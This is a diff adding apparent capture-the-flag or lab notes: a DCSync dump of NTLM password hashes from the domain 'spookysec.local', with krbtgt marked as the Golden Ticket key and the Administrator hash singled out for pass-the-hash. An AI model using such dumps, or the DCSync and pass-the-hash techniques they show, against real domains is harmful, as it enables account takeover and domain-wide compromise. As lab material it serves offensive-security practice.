@@ -1,0 +1,12 @@
+Full domain NTLM hash dump via DCSync (impacket-secretsdump, backup account's replication rights)
+Domain: spookysec.local  ·  DC: 10.129.173.201  ·  Date: 2026-11-23
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::   (Golden Ticket key)
+a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::  (human Domain Admin; same pw as Administrator)
+svc-admin:1114:...:fc0f1e5359e372aa1f69147375ba6809:::
+backup:1118:...:19741bde08e135f4b40f1ca9aab45538:::
+james:1105:...:9448bf6aba63d154eb0c665071067b6b:::
+(+ skidy, breakerofthings, optional, sherlocksec, darkstar, Ori, robin, paradox, Muirland, horshark, machine acct)
+
+>>> Administrator NTLM for Pass-the-Hash: 0e0363213e37b94221497260b0bcb4fc
